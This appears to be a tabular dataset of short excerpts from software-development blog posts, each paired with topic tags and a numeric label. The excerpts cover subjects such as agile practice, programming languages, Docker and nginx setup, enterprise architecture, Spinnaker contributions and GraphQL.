883,"I will mention some of the tools currently being used in modern Android stacks.1. Android Lint While some of those can be used only for code style and formatting (e.g. Kt Lint) others can really detect bugs using static analysis (e.g. Error Prone, Find Bugs or even Android Lint with custom rules).","['Continuous Integration', 'Android', 'Danger', 'Jenkins']",19
884,People often misunderstand me when I say that. They think Im saying testing isnt important. Testing is central to software development. It should be taught as part of university and technical college curricula. Its a failure of our educational system that this fundamental skill is ignored or glossed over in schools. The idea of testing software should not generate all the circular debates and angst that it seems to produce.,"['Agile', 'Agile Methodology', 'Software Development', 'Business Agility', 'Continuous Delivery']",13
885,"That isnt to say a single individual ought to be able to do everything with a high degree of expertise. Technical environments are too complicated for a generalist developer to handle everything. Agilists like to talk about the generalizing specialist or T-shaped person. Web developers like to talk about full stack engineers. There are limits to how far those ideas can go. The larger and more heterogeneous the environment, the harder the boundaries become.","['Agile', 'Agile Methodology', 'Software Development', 'Business Agility', 'Continuous Delivery']",12
886,"The boundaries to generalization arent between activities. They are between discrete and complicated technical areas, like front end, mobile, machine learning, and mainframe. Within each area of technical specialization, each developer can possess and apply skills across programming, testing, and analysis activities. Otherwise, they shouldnt be called developers. They should be called programmers or testers or analysts, depending on which fundamental skills they have and which they lack.","['Agile', 'Agile Methodology', 'Software Development', 'Business Agility', 'Continuous Delivery']",12
887,"This corresponds in a general way with the Lean notion of focusing on flow. Are there aspects of the canonical Scrum model that work very well at Basecamp 2, but that interfere with flow once we try to operate at the Basecamp 3 level? Now that weve solved the delivery issues we had when we were operating in the PE quadrant and learned to deliver predictably in the PC quadrant, might some of the very same solutions turn into problems in the AC quadrant? I suggest the existence of functional silos or hard specializations within each delivery team introduces a speed bump to delivery. Your programmers, testers, and analysts may be collaborating effectively and delivering predictably within the operational limits of a Basecamp 2 organization, and that is a Good Thing. Youve become proficient with novice-level Scrum, running two-week Sprints and delivering predictably against your Product Backlog. But continuing with the same model will not take you far into the AC quadrant.","['Agile', 'Agile Methodology', 'Software Development', 'Business Agility', 'Continuous Delivery']",1
888,"A lot of people are surprised and saddened by the fact that Java Script has been eating the world. But its not because young people are too stupid or too hip for their own good, its because a lot of languages just arent all that great. I am not saying that language designers deserve no respectnot at all I have nowhere near the capability to be a language designer and implementer. It is precisely because it is hard to create a good language, that no such great language exists, even in 2019. And it takes time to get real-world feedback so that language designers can improve over timethe feedback loop is not exactly tight. By the time the feedback loop comes back, the language designer is practically retired.","['Programming', 'Software', 'Software Development', 'Nodejs', 'JavaScript']",9
889,"Makes writing asynchronous code easymost runtimes have to handle an async event here or there, there is no avoiding itthe easiest way for the developer to avoid mistakes (and the need to put locks everywhere) is to design a language that doesnt have (thread) pre-emption. For example, there is no pre-emption in N __url__ your scheduled code runs first, when it finishes running, then then the event loop moves to the next tick. If N __url__ had pre-emption, the platform wouldnt have worked at allthe absence of pre-emption is one of the reasons why its such a powerful platform. I believe all JS runtimes are bound to this constraint, but I am not 100% sure, (someone back me up?). On the other hand, Java has thread pre-emption and this makes asynchronous programming hard (especially to write libraries for general use). Pre-emptive software environments are simply bad or morally wrong, if you will. *Must compile to machine-code for performance. This of course does not prohibit the language from having a VM as well, and being interpreted by that VM instead of compiled to machine code (ftr, Java is compiled to bytecode then interpreted).","['Programming', 'Software', 'Software Development', 'Nodejs', 'JavaScript']",3
890,"Nominal-typing seems to offer few advantages to structural-typing afaict. Structural-typing makes libraries less bloated and easier to write. FP languages are more often structurally-typed than OOP languages, and I think structural-typing is unequivocably better. Structural typing is especially useful for interoperability between libraries. (Otherwise both libraries need to import each other, right? )Inferred* typingtypes should be inferred as much as possible, chaining and FP seem to help with this, whereas pure OOP seems to mean a lot of duplicate declarations.","['Programming', 'Software', 'Software Development', 'Nodejs', 'JavaScript']",9
891,"Furthermore, a simple example of pre-emption gone wrong: By *structural typing, we mean that type-checking only looks at properties (the composition of an object) not at the names of classes/types. Structural and nominative typing dont differ when you pass primitives as arguments. But when you pass an object to a function, it will compile in a structurally-typed language as long as it has the expected properties/methods. For example, with Type Script: By *inferred types, at the very least we mean if we pass a function to another function or method, that it will know exactly what the argument types are. Here Golang fails at this simple exercise: Unlike Golang, if we use Type Script and we have a method definition, and pass a callback function, it knows the types of the arguments to that callback function, so you dont have to redeclare them. Whereas with Golang, we have to redeclare the types of the callback arguments which is kinda lame.","['Programming', 'Software', 'Software Development', 'Nodejs', 'JavaScript']",9
892,"Java is an excellent language for a lot of modern software. The biggest problem I have with Java is that it has a nominal/nominative type system instead of a structural-type system and this is why the Java ecosystem is so bloated. Over time, tools like GWT for writing web apps proved to be fairly unproductive compared to using modern JS. But Java is great for servers and Android. To this day, it appears like Vert.x is the best system for writing Java servers. Also, Java programs are not especially easy to compile, and this has contributed to the fact that excess tooling is necessary to get Java programs running which is a headache and huge reason why so many Java devs dont know much about the command line. Totally dependent on the IDE tooling to get anything done.","['Programming', 'Software', 'Software Development', 'Nodejs', 'JavaScript']",9
893,"Golang was so promising but its lacking in a couple of key areas. Not very supportive of functional programming at all, and lacks generics and inheritance which are useful OOP features. Golang does score major points with regard to being structurally-typed, proving that a structural type system can compile very quickly, however it requires redundant type declarations (see above) which other structurally-typed languages avoid (Type Script and OCaml being some examples). Golang also has a somewhat restrictive circular dependency issue where two files in different packages cannot depend on each other (although maybe all compile-to-machine-code languages have this restriction? So, Golang is good for writing simple high-performance servers, but what else? In my opinion, OCaml is the most promising of all of themthe one thing it lacks is good concurrency. OCaml was created before the age of modern multi-core machines and never had a solid concurrency model other than spawning another process. I believe it has threads but also has a GIL. With Reason ML on the move, OCaml might be getting more mindshare. I see that there are big efforts to improve OCaml concurrency including multi-core OCaml and binding the Libuv Event Loop engine used by N __url__ to OCaml.","['Programming', 'Software', 'Software Development', 'Nodejs', 'JavaScript']",9
894,"Erlang is coolits a high-performance dynamic language, like Java Script. JS and Erlang are the only two dynamic languages that make this list. Without Type Script and Dialyzer, they wouldnt have made it though. Theres a couple problems with Erlangits useful only to build scaleable backendsnot UIs or mobile apps, etc. It has type-annotations (which Dialyzer uses) but those type-annotations are nominative not structural. Using 3rd-party libraries and trying to figure out how they work without types can be a headache. Type-annotations might help for that, but I bet theyd be better if they were structural annotations. I think we could build mobile apps with Erlang, like we do with Swift and Java, but without a real type system this could get pretty hairy.","['Programming', 'Software', 'Software Development', 'Nodejs', 'JavaScript']",9
895,"Using non-preemption at the language/runtime levelfrom what I can tell most languages allow for pre-emption which can arbitrarily change the order of executionthe developer expects code to execute in a certain order but pre-emption can change that, when doing asynchronous development. The developer can handle pre-emption manually with locking (although this can be painstaking and error-prone) but writing libraries for general use in multiple environments can be a lot harder when pre-emption is something that needs to be worried about. Garbage collection in Node.js: __url__ files.","['Programming', 'Software', 'Software Development', 'Nodejs', 'JavaScript']",15
896,"How do we provide tools like email, real-time chat, and CI/CD in a cost-efficient manner? When we grow as an organization, how can the infrastructure scale while still keeping costs down? The easy way out would be to go for Saa S subscriptions. $5/mo/user for GSuite, $12/year/user for Slack, $25/mo for a Git Hub organization and an additional $9/mo for extra users you can see how all of this can really pile up. It even becomes more of a problem when you scale these tools for use across the entire organization. We estimated that UXSoc would have to pay a whopping PHP 270,000.00 if these Saa S tools were used for every member of the organization.","['Docker', 'SaaS', 'Kubernetes', 'K8s', 'Self Hosted']",10
897,"Let's create a Helm Chart CRD as below,Notice here the namespace in the metadata is for the Helm Chart Object. K3s monitor this CRD object in the kube-system, launch a Helm install job if there is any new Helm Chart object created. (I confused with my deployment initially, putting my target namspace jenkins. )In the spec, chart defines which repo and Helm chart to deploy. The target Namespace is where my Jenkins suppose to reside in. Instead of using the set keyword as in the readme sample, I use values Content where I can apply the same format of the charts __url__ file.","['Kubernetes', 'K3s', 'Multipass', 'Helm', 'MacBook']",7
898,"When aspired programmers and well-established engineers consider learning a new technology, they take into account various factors. The most important things usually include technical benefits of the language, the size of the community, the learning curve, the industry adoption, the salary, the number of available jobs etc. Of course, all people have different motivations and priorities so weve decided to compile a list of the key aspects that might influence your decision. All the developers in N-i X Scala team have different stories about how and why they adopted this technology. Today they share their top reasons to learn Scala. Maybe, youll even give it a try and join our Scala team.","['Programming', 'Scala Programming', 'Software Development']",9
899,"Learning Scala is not so difficult as it seems When talking about how difficult it is to learn this language, opinions differ. Some people say that the barrier to entry is steep and you have to spend quite some time to master Scala. On the other hand, many programmers point out that learning Scala takes as much time as any other language. The challenge mostly lies in transition you need to make when starting functional programming. Its a different paradigm, which is both complicated and interesting to try. In any case, this is a great investment which will definitely pay back in the future.","['Programming', 'Scala Programming', 'Software Development']",9
900,"Hello World in Scala Hello World in Java You can achieve great performance Scala is an incredibly scalable technology. Its integration with Reactive Manifesto enables you to process big loads of data. Moreover, its built with concurrency in mind, which goes with the ideas of massive parallelism and reactive programming. Concurrency allows you to execute the units of your algorithm out-of-order and the final outcome remains the same. Writing asynchronous software, you will know how to deal with massive inflows of new users. As a result, you can build highly performant systems that can scale really fast.","['Programming', 'Scala Programming', 'Software Development']",9
901,"Throughout various jobs, titles, and teams Ive been on in the last few years Ive often been given the task of estimating how long a task will take. Put simply, you dont know what you dont know. Especially when its the first time that you are estimating a task of a specific nature, youre only going to have a vague idea of what accomplishing said task is going to consist of. Without knowing that youre almost certainly doomed to fail.","['Mentoring', 'Life Lessons', 'Productivity', 'Time Management']",0
902,"Say a bug was just reported by a customer to one of our customer service representatives. The normal way that this goes down is the CS rep will open a bug report with the required team, an engineer will pick it up and say something along the lines of This looks like an easy fix. Probably an hour or two at most. So the ticket gets recorded as half a Developer Day. When the secondary developer, the one actually doing the work, picks up what they think is an easy ticket theyll be blind sided by the fact that what should have taken them an hour to fix winds up not being ready for release for three days. Where did this extra time go? Well, for starters the description in the ticket was Customer X not seeing required field within the search box. Which, while not clear might get the job done, if the person reporting the issue is the same one that fixes it. Thats not the case here though, so now the developer has to reach out to customer service in order to find out what field is missing in which search box. After reaching out, it was determined that an impromptu meeting is necessary so the CS rep can show the developer an example. With this meeting done, the developer returns to their desk with a screenshot in tow.","['Mentoring', 'Life Lessons', 'Productivity', 'Time Management']",13
903,"Now that the developer knows what the problem is, they can start digging in to find out why the problem is happening. After looking at the codebase, they realize that everything should be working fine and are now stumped as to the cause of the issue. So now the quest is on to look at all of the tickets that were released recently. Once done digging through the production releases for the last week, two tickets stand out as possible root causes. So, a meeting is setup with each of the respective developers to find out why the changes may have caused the original bug. With much debate as to how the two respective tickets shoudnt have broken anything, as all tests had passed with them, it was obvious that there was a gap in the test coverage of the application. So, being the good test driven developer that they are, a test was constructed that now failed the build due to this broken condition. Having accomplished no visible progress, the dev went home for the day.","['Mentoring', 'Life Lessons', 'Productivity', 'Time Management']",13
904,"Now it would be easy to blame the extra time on the lack of knowledge by the dev, the seemingly excessive meetings, or the extra time the QA process took. The reality is though, that all of that time should have been taken into account in the start. The original engineer doing the estimation should have seen that the ticket description was very minimal and padded with time to find out a better description. Or taken it upon themselves to reach out to CS before handing the ticket off. As well, the estimate should have been padded with the known QA time as every single ticket has to go through that same process. Finally, the actual dev work of looking into the problem, adding a test case so that the problem never crops up again, and manual testing of the problem is never going to happen within a two hour time window, and the engineer should have known that.","['Mentoring', 'Life Lessons', 'Productivity', 'Time Management']",13
905,"If the estimating engineer, normally a more senior engineer on the team, didnt take that all into account something must be off, but what? Well, for starters humans tend to be terrible at estimating time in general. Look at a clock until it starts the next minute, and then look away for sixty seconds. If we cant even estimate how long a minute feels how are we supposed to estimate tasks that can take hours or days? Secondarily, humans tend to focus on optimistic time, where we estimate how long something will take based on the fastest time that it has ever happened in. For an example of this, think of your commute to work. If according to the GPS its a twenty minute drive, but you know that if you hit every light perfectly you actually arrive at the office in fifteen minutes. Its very easy for the human brain to then adjust the expected time to be fifteen minutes, and consider the normal twenty minute drive to be slow.","['Mentoring', 'Life Lessons', 'Productivity', 'Time Management']",1
906,"Try this: go up to some co-workers and ask them how long it takes them on average to commute to the office and then have them check it with a GPS app. Their responses will almost always be quicker than the GPS estimation. The same thing happens with code. If the estimating engineer had had a similar bug come in with a different part of the website, and seen and resolved the issue within thirty minutes, with a five minute code review, and a pass of only the light test cases then the ticket took them an hour, maybe two at most. So when they are tasked with estimating the task, an hour or two has become the default case when in reality it is the exceptional.","['Mentoring', 'Life Lessons', 'Productivity', 'Time Management']",13
907,"But adding labels and markers all through the code gets tiring. It makes the code look contrived, and gives you the feeling that half your code is just instrumentation. Last week, Felipe Guizar Diaz and I were preparing our weekly Birds of a Feather Architecture session. He was preparing a talk on Frontend Reactive Architectures. We started by talking about Vue using setters and getters to implement reactivity. He prototyped a Store with event listeners, and used setters to notify the store of value changes. Then we moved onto implementing the same reactivity but with ES6 Proxy.","['Serverless', 'Observability', 'Es6 Proxies', 'JavaScript', 'AWS Lambda']",9
908,"One of the primary principles for Dev Ops is to modify your processes to have the minimal number of hand-offs to perform a task. In Dev Ops, the focus is generally with the SDLC (i.e. CI/CD) but minimizing hand-offs can be applied to most processes in your team. Initially, you need to evaluate the existing process by first confirming that it is still relevant. Subsequently, you can look at streamlining the process to have the minimum number of steps required to achieve the outcome. Once defined, you can look at automation. But remember, even though automation is important and generally a good idea, theres no point in automating a poor process, or a redundant one. Once you confirm that a process is required; optimize it, then automate.","['DevOps', 'Software Development', 'Agile', 'Collaboration', 'Team']",1
909,"So, what if I want to debug the web app? Its hard to debug inside containers. Its definitely worth being able to run a local app with other containerized services alongside. Its even possible to run a local app and a containerized app side by side and this can be quite useful in development to test for side effects. After all, we want to build scalable apps and here scaling is part of the development environment So, why doesnt it work? For one, the containers are spun up with all the environment variables __url__ specified, which we dont have available locally. Moreover, our locally running app doesnt recognize the db host specified in our Django settings, because the containerized database is mapped to a port on localhost.","['Docker', 'Python', 'Software', 'DevOps', 'Cloud Computing']",10
910,"We therefore make a few small changes to our __url__ file so that all local app and containers to run side by side. Well use a useful python package called decouple. Lets also remember to add that to our requirements! The decouple module is a bit more sophisticated than getting our config directly from environment variables (POSTGRES_PASSWORD = os.environ.get(POSTGRES_PASSWORD)). It also applied a useful and commonly used hierarchy to obtaining config: First, look for an environment variable, otherwise check for __url__ file in the project root, otherwise go for the default. It also throws useful exceptions such as So, our locally running app will try to locate __url__ file and read optional parameters from there, but only if the environment settings are not set. Lets notice the fallback option for the DB_HOST is localhost as this is not specified in __url__ file, instead we specify this in our __url__ file under the web service: The db setting change to this: We will add the DJANGO_DEBUG=True to __url__ file. Now, we just have to catch up with our container in our local environment and add the required Python Postgres module to our local virtual environment (pip install psycopg2-binary).","['Docker', 'Python', 'Software', 'DevOps', 'Cloud Computing']",7
911,"So, we are still running Djangos development server inside our container. In the spirit of moving closer to a production environment, well switch to a proper web server and since all the cool kids are using nginx these days, so will we. Peer pressure, what could go wrong? There is also an official repository of nginx. Lets go ahead and add that as a service: We are mapping nginxs port 80 to our localhost port 8088. We dont worry about running out of ports as we have another 60000+ available (2 to be precise).","['Docker', 'Python', 'Software', 'DevOps', 'Cloud Computing']",10
912,"Lets check if its running by visiting http://localhost:8088. Also, we can note the nginx logline in the terminal where weve spun up our containers: So this nginx proxy server will help us handle requests and serving static files, but first we need to configure nginx by adding a config file: A really dead simple configuration would look something like this: So, we telling nginx to listen on port 80 and we forwarding requests to / on this port to our web service on port 8001. At the same time, lets add the nginx service to the same network as the web service, make sure web is up and running when we fire up nginx and also put the config file from our local repo where it should be in the container by mapping a volume: Now, well also change the container to run a proper web server instead of a simple Django development server. Well opt for gunicorn, so lets add that to our requirements: Its totally optional to also install gunicorn locally as our intention is to run the Django debug server locally and gunicorn in the container. To kick off a gunicorn server in our container, we modify our command in __url__ for the web service to the following: For now, lets add both 'localhost' as well as our WEB_HOST to the list of allowed hosts in our Django settings.py. This allows us to access our webapp when it is running locally as well as inside a container.","['Docker', 'Python', 'Software', 'DevOps', 'Cloud Computing']",11
913,"Now, if we hit our nginx service at http://localhost:8088/admin, well be served our admin login page but it looks different to what we are used to. Its because our gunicorn server is not intended to serve static files, so we will have to configure nginx to instead serve the static files. To this end, we add the following lines to our default.conf: Next, we approach the Django side of static files. At first lets tell Django where we would like our directory for static files in its settings.py Well update a our __url__ file to map our local directory with the static files to a directory in our container: Finally, we run python mysite/ __url__ collectstatic and all static files for our app are pulled into the chosen directory. We should see the difference by refreshing our page on http://localhost:8088/adminit should now look familiar. When we hit our web service directly on http://localhost:8001, we see the static files cannot be found since they are being served by the nginx service.","['Docker', 'Python', 'Software', 'DevOps', 'Cloud Computing']",7
914,"We can also see that in our logs these things are recorded. There is quite a bit of information there. For example, nginx informs us about all the files it served on the request we have just sent off and the status codes 200, meaning success, is good news. However, the favicon could not be found as we are also notified by the log of the web server. For now, lets just add this line to our nginx config, so that it stops complaining about a favicon: Ok, this stack is in pretty good shape by now. Lets make the data of our Postgres db service persist by mapping it to a local volume, which is very similar to what we have done for the SQLite data (Also lets not forget to add that directory to our.gitignore!","['Docker', 'Python', 'Software', 'DevOps', 'Cloud Computing']",11
915,"Now, a quick recap of what our setup looks like. We have multiple services running side by side now: Our main endpoint, the nginx service (http://localhost:8088)Direct endpoint of the app server (http://localhost:8001)The Postgres admin endpoint (http://localhost:8080)Our Postgres db service listening for connections (but not HTTP requests) (localhost:5432)If we run an app locally, we can also access it (http://localhost:8000)I would say we have already come along way from where the Django tutorial started off. All but the local app above are running once we execute one simple command: docker-compose up. Almost all of our infrastructure is defined in code and configuration is transparent. We also made our life easier by having a data migration handle the creation of a superuser. In order to get stuff up and running from a blank slate, one would have to run only two commands: Ok, granted wed also have to add __url__ file and create a virtual environmentsomething to automate at some point perhaps. Our database is persisted however, so if we tear down our containers, we can start everything from scratch and our admin user is still there and we can login to the admin/ endpoint and also the db-admin service.","['Docker', 'Python', 'Software', 'DevOps', 'Cloud Computing']",11
916,"Now, it would be prudent to separate the configuration for our various environments a bit more carefully and Docker has some neat functionality. First off, we move all our migration specific config into a separate YAML file (docker-compose.migrate.yml), such as the creation of our superuser. Lets pool all the setup tasks in one bash script that gets invoked inside this specific container, such as collecting static assets and running migrations. As a side note, this service will have to wait for the database inside the db service to be ready to accept connections, otherwise it will fall over. This is called controlling the startup order. Luckily, there is a neat little bash script that we can use to make the migrate service check for services being ready. Our service is started with the following commands, which wait for database connections being ready and runs migration as a collective: We can run these one off tasks by explicitly pointing Docker to this YAML file and make sure to remove the container once its all done: docker-compose -f __url__ run migrate -drm At this point, lets follow a similar approach to move all the development specific configuration into docker-compose.override.yml. Docker will automatically read this file and use it override the config in the base docker-compose.yml. Hence, we can keep debug flags, admin consoles, open ports and the mapping of directories separate from the basic service definitions.","['Docker', 'Python', 'Software', 'DevOps', 'Cloud Computing']",7
917,"Finally, lets touch on the topic of logging. I say touch because the topic is worth many articles in itself. In fact, logging has turned into a whole industrythere are multiple companies like Splunk and Sumo Logic that offer managed solution to handle logging. Also all the cloud providers offer such services and it often makes sense to go with such a solution before you start managing log aggregators yourself. Specifically if your goal is to develop. So, while we are on a local machine, i.e. our laptops, well keep our logs going to the standard output. Thats the most straight-forward way of keeping an eye on things. Also, all apps and services inside containers should stream to stdout as thats where docker will catch those logs and pipe them to your local stdout. Now, Docker also has many other ways to handle logging and this can be specified by the logging drivers for each service individually.","['Docker', 'Python', 'Software', 'DevOps', 'Cloud Computing']",11
918,"So we could also run a log aggregator in a Docker container, and this image contains the entire ELKthat stands for Elastic Search, Log Stach and Kibana. However, things will get intricate at this point. Depending on which logging driver we opt for, we could end up sending logs directly to Elastic Search, but others would stream to the Log Stach services, while yet other options would require a separate service to handle logs from all places and send them to their respective destination. Feel free to go down that rabbit hole and marvel at how complex things will get. No need for an explanation why manages log aggregation services are doing good business. So, unless you are actually setting up shared staging or production environments, let the logs in the development stage go to the standard output.","['Docker', 'Python', 'Software', 'DevOps', 'Cloud Computing']",7
919,"In practice however, practitioners still struggle to introduce the effective EA mechanisms and to avoid the increase of bureaucracy, overlaps and conflicts with other organizational management functions. The EA efficiency depends strongly on its particular implementation, adoption and positioning in the organizational decision process and structures. Currently EA is not sufficiently standardized as a system engineering discipline. The frameworks proposed and being iteratively developed by industry (e.g. TOGAF, Zachman), still provide rather high level descriptions and definitions of the artifacts and processes. As a result, the EA in many organizations, is implemented just as an umbrella to multiple aspects of IT management and governance aspects such as application portfolio analysis, solution architecture, service management etc. On the other hand, in many cases it lacks the holistic, integrated and complete view of all aspects of organizational systems from strategy formulation till its execution.","['Enterprise Architecture', 'Systems Engineering', 'Technical Architecture', 'Solution Architecture']",12
920,"In light of the general theory of systems and systems thinking the enterprise can be also perceived as a complex socio-technical system composed of people, process and technology (Dietz et al., 2006). Systems thinking draws upon the assumption that the entity can be analyzed from the perspective of an interaction and relationship between its component parts. generalizes the systems concepts as a larger entities in which we function and furthermore he defines the organizations as a subsystems of a larger enterprise systems. Roth also argues that systems thinking is vital to understanding enterprises and to operate it effectively (Roth et al., 2015). The popular EA framework TOGAFpromoted by Open Group, in its newest version 9.1 extended its scope and now considers more holistically, the entire enterprise as a system.","['Enterprise Architecture', 'Systems Engineering', 'Technical Architecture', 'Solution Architecture']",12
921,"Furthermore, every system can be perceived also as a part of larger systema context in which it operates. The organizational systems are placed in a wider economic, political and social environment. They are constantly influenced by the market forces and technological and business innovations resulting in the need for constant adjustment of the business strategy and organizational capabilities. The increase in the market competition enforces the companies to merge, consolidate or constantly update their strategic alliances which results in a continuous organizational transformation. As a result the enterprises endlessly update their strategies, innovate and implement new business models and technologies. The bigger the organization the more complex is the transformation and more sophisticated governance and management tools and methods are required to efficiently execute the change. Martin Op t in his book Creating Value by informed Governance argues that in context of current market challenges related to global competition, market dynamism and complexity of the organizations there is a need for new instrument and above all a coherent, consolidated and systemic approach to manage the organizational changes (Op t et al., 2009).","['Enterprise Architecture', 'Systems Engineering', 'Technical Architecture', 'Solution Architecture']",12
922,"A system oriented perception of an organization allow its decomposition into multiple subsystems, layers, views and components and ease the analysis of the complex relationship and dependencies between them. The popular vision of the organizational system defines it as a system of systems (i.e. business capabilities, functions and services), information and technology (i.e. Each organizational subsystem can be further decomposed into sub-layers and components, for example the business processes can be decomposed into sub-processes, functions and services and IT layer into application, data and IT software and hardware infrastructure. Such a methodical description of the organizational system structures creates a basis for efficient planning and communicating its changes.","['Enterprise Architecture', 'Systems Engineering', 'Technical Architecture', 'Solution Architecture']",12
923,"EA has naturally evolved from the IT world focusing primarily on the IT systems landscape but it is increasingly being adopted by the business and it gradually becomes the integral tool and method of the business strategic and organizational planning. With the assumption that the organization can be perceived as a socio-technical system of systems the EA can be considered a specialized discipline of the system and enterprise engineering. System engineering in turn is perceived as a problem solving method with holistic an integrative approach (Griffin, 2007), that looks at the big picture of the problem and all its socio-technical aspects and composing parts (Williams, 2006) (Kapurch, 2007). The common systems engineering definitions summarized by Moser in his book Systems Engineering, Systems Thinking, and Learning emphasize aspects such as: holistic, integrative and multidisciplinary view, but also continuity, iterative, phased and top-down approach (Haskins et al., 2010)(Eisner, 2002)(Sage 1980)(Williams, 2006)(Griffin, 2007). Sage, defines systems engineering as a supportive for management in direction, control, and regulation of activities relative to forecasting, planning, development, production, and operations of total systems and to maintain overall integrity and integration as related to performance and reliability (Sage 1980). Furthermore the enterprise engineering and enterprise architecture as a sub-discipline of systems engineering, are focused on building or changing the organizational systems. They provide methods and tools allowing problem solving by structured and systemic decomposition of the organizational systems structures into smaller partssubsystems and components and analysis of their relationship and dependencies, thus improving so called business and IT alignment (Nadler et al. The modeling and visualization techniques such as viewpoints increase the transparency, understanding and ease the communications between multiple stakeholders and reduction of the informational silos (Op t et al., 2009).","['Enterprise Architecture', 'Systems Engineering', 'Technical Architecture', 'Solution Architecture']",12
924,"Essentials of project and systems engineering management, 2nd edn. Wiley, New York Fritzenschaft, T. 2014. Critical Success Factors of Change Management An Empirical Research in German Small and Medium-Sized Enterprises.","['Enterprise Architecture', 'Systems Engineering', 'Technical Architecture', 'Solution Architecture']",5
925,"Enterprise Architecture Creating Value by Informed Governance. Springer-Verlag Berlin Heidelberg Roth, G., L., Di Bella, A., J. Systemic Change Management: The Five Capabilities for Improving Enterprises.","['Enterprise Architecture', 'Systems Engineering', 'Technical Architecture', 'Solution Architecture']",12
926,"Design of Enterprise Systems: Theory, Architecture, and Methods, CRC Press, Boca Raton, FL, p. 3Rodrigo Magalhes. Organization Design and Engineering The Open Group.","['Enterprise Architecture', 'Systems Engineering', 'Technical Architecture', 'Solution Architecture']",12
927,"Get Up To Speed Read the docs. There are some great resources out there to help you get a feel for the expectations. I found it helpful to go ahead and have some ideas about the standards and requirements before I started hacking away. The structure of open-source projects necessitate stricter guidelines for commits. Especially projects that have a high volume of contributions. A lot of the practices were new to me, but with some reading and practice they became more intuitive. Getting to know the tool set was also vital. I picked up a copy of Spring in Action (I would recommend something more Spring Boot oriented though). I also went through some of Spring and Gradle documentation as well. An operational knowledge of Spinnaker was also invaluable. Knowing what you expect to find in a codebase makes navigating it much easier.","['Spinnaker', 'Open Source', 'First Contribution']",18
928,"Set Up A Remote Development Environment I chose remote development as my strategy for two reasons. First, because my dev machine does not quite have the horsepower (4 CPU, 18GB of RAM) to run Spinnaker locally with room for my browser and editor. Secondly, I wanted to be able to leverage an environment that would be easy to smoke test features that I write. I turned to Packer and Chef to create an image suitable to run Spinnaker (java, yarn, etc) for reproducibility. There is a nice new environment in Halyard called local Git. I used this to get the services started from source on the remote box. You can fork all the Spinnaker repositories and create a Halyard configuration that uses your Git Hub account as a source for the Spinnaker services. Lsyncd and SSH tunnels enabled me to develop locally and externalize the compute resources required to run Spinnaker.","['Spinnaker', 'Open Source', 'First Contribution']",7
929,Lsyncd handles the file-watchers and pushing the files that had changed to the remote VM. If you are running on OSX you might have to point Lsyncd at a updated version of rsync. The system rsync version might not be compatible. Configuration is pretty simple and the documentation has lots of examples. Here is an example config: SSH tunnels example: The combination of lsyncd and ssh tunnels lets you push file changes to a remote box which actually runs the services but the ports look like they are hosted locally. I ended up starting Clouddriver by hand for debugging. If you need to do that I found the following command helpful: This command points the service at the halyard generated configs to give some continuity with the services started by Halyard. Add the debug-jvm option if that is the service you want to debug. The local Git repo also adds some start scripts in ~/dev/spinnaker/scripts.,"['Spinnaker', 'Open Source', 'First Contribution']",7
930,Navigating The Codebase I received some direction on which files in the codebase were the most relevant. This gave me the right start to be able to piece together the relevant objects and find the right spot for the new functionality to go. I created a UML diagram and traced the code for some time before I made much progress in actually writing code. Then I established some testable goals and got started. This part is exclusively dependent on your skills as a developer so it wont be covered here. The only thing I have to say is that I think Kotlin > Java > Groovy is the current attitude for new code.,"['Spinnaker', 'Open Source', 'First Contribution']",9
931,"First Pull Request After hacking together what felt like a well a hack. I thought I would give a pull request a try. I committed my code and pushed to origin master according to the contribution guide and initiated a pull request. I start to celebrate then I see a message from Travis. I had forgotten the colon needed in the commit header. Easy enough, I will just edit my message with a rebase. As it turned out I am less of a wiz with Git than I thought. After some failed attempts at remedying my problems, I opted to start a new branch and try a new pull request. A key take away here was learning that the community is really open to helping you navigate the areas that you are unfamiliar with. Aim to deliver a high quality pull request but try not to be paralyzed by potential hiccups. For those who also struggle with rebases here is a little demo: Second Pull Request With some renewed direction I dug deeper into the codebase and came up with a solution that fit the patterns that were already present. I learned some tips for rebasing and writing the commit messages. The two that were key for me are: Use interactive git commit message utility rather than doing inline commits with -m or here Docs with -F-.","['Spinnaker', 'Open Source', 'First Contribution']",18
932,"This is more interesting as there are a couple of options for Jenkins. One option is to use Jenkins Job DSL plugin (JDSL) to completely automate the initial creation and content of your jobs, but using JDSL usually implies that there is one Jenkins instance for multiple teams or a central one for the whole company (this works well when all projects follow the same convention). Also, the initial cost of creating a quality seed JDSL job can be time-consuming and it pays itself of the more jobs you create with it. So what if you dont want to heavily invest in JDSL? My answer to that is to try Jenkins Shared Library (JSL). Although it is possible to combine JDSL with JSL, in this article, Im going to focus on JSL alone.","['Jenkins', 'Pipeline', 'Jenkinsfile', 'Jenkins Shared Libraries']",18
933,"Have you ever been frustrated with using REST APIs for supporting multiple clients types both mobile and desktop? Things move so quickly these days on the client side, with incoming product requirements and customer feedback, that managing both UI and API updates become a nightmare. You may have to add mobile-specific fields to your API, which the Desktop clients dont really need, or worse, you end up creating different versions for different clients and have to evolve them individually. Dont get me wrong though, Ive used REST for quite some time and its great for what it allows for. You can have stateless server implementations which structured access to resources. Its very quick to spin up a RESTful API in a matter of minutes and is supported by frameworks across all the major programming languages. But as you know REST as a spec is widely misunderstood and everyone company out there has its own flavor of it. The clients become tightly coupled with their back-ends and thus become difficult to iterate over. Resource access through convoluted specs like HAL and HATEOS is just a pain in the ass, and difficult to maintain. And finally, under-fetching and over-fetching ( more on these in the sections below ) is a real issue, keeping in mind empathy towards your end users data usage and overall experience in mind.","['GraphQL', 'Restvsgraphql', 'Js', 'Query', 'React']",19
934,"A typical RESTful implementation for this would have endpoints as below /api/user/<id>/api/user/<id>/likes-received/api/user/<id>/right-swipes Each of the above endpoints would return a JSON payload containing data for different parts of our page. The JSON payloads may take a shape like below 1.) To a REST veteran this seems totally fine. But pay more attention and youll see that the APIs return more data than were actually showing on the client. The fields like age, email, etc. are redundant for this particular screen and thus results in a wastage of users precious bandwidth. This is a typical case of Over-fetching. Also as you can see that this is profile page and it requires 3 API calls to render it. This means that our /user API endpoint is insufficient to get all the data to show a users profile page, and thus it Under-fetches.","['GraphQL', 'Restvsgraphql', 'Js', 'Query', 'React']",11
